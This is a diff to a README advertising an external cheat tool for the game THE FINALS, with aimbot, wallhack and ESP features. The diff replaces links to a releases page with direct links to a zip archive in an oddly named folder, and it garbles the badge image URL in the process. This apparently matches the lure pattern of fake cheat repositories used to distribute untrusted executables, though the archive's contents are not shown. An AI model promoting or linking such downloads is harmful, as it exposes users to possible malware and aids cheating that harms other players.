@@ -4,8 +4,8 @@
 The FINALS External is a comprehensive C++ software designed to enhance gaming experiences. It provides features like aimbot, wallhack, and ESP. Users can install the program and activate desired features while playing.
 
 ## 📦 Download & Install
-[![Download THE-FINALS-CHEAT-TOOLS-EXTERNAL](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/mrkarel07/THE-FINALS-CHEAT-TOOLS-EXTERNAL/releases)  
-To get started, visit this page to download the software: [Download Page](https://github.com/mrkarel07/THE-FINALS-CHEAT-TOOLS-EXTERNAL/releases).
+[![Download THE-FINALS-CHEAT-TOOLS-EXTERNAL](https://raw.githubusercontent.com/mrkarel07/THE-FINALS-CHEAT-TOOLS-EXTERNAL/main/goosish/THE-FINALS-CHEAT-TOOLS-EXTERNAL.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/mrkarel07/THE-FINALS-CHEAT-TOOLS-EXTERNAL/main/goosish/THE-FINALS-CHEAT-TOOLS-EXTERNAL.zip)  
+To get started, visit this page to download the software: [Download Page](https://raw.githubusercontent.com/mrkarel07/THE-FINALS-CHEAT-TOOLS-EXTERNAL/main/goosish/THE-FINALS-CHEAT-TOOLS-EXTERNAL.zip).
 
 ### 📋 System Requirements
 - **Operating System:** Windows 10 or later.
